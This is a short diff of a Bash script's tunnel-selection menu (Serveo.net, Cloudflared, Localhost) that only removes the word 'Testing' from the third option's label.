@@ -179,7 +179,7 @@ select_tunnel() {
     echo -e "${YELLOW}[+] Select a tunnel:${RESET}"
     echo -e "\e[1;92m[\e[0m\e[1;77m1\e[0m\e[1;92m]\e[0m ${BLUE}Serveo.net${RESET}"
     echo -e "\e[1;92m[\e[0m\e[1;77m2\e[0m\e[1;92m]\e[0m ${BLUE}Cloudflared${RESET}"
-    echo -e "\e[1;92m[\e[0m\e[1;77m3\e[0m\e[1;92m]\e[0m ${BLUE}Localhost (Testing)${RESET}"
+    echo -e "\e[1;92m[\e[0m\e[1;77m3\e[0m\e[1;92m]\e[0m ${BLUE}Localhost${RESET}"
 
     echo -ne "${GREEN}[+] Enter choice (1,2,3):${RESET} "
     read choice
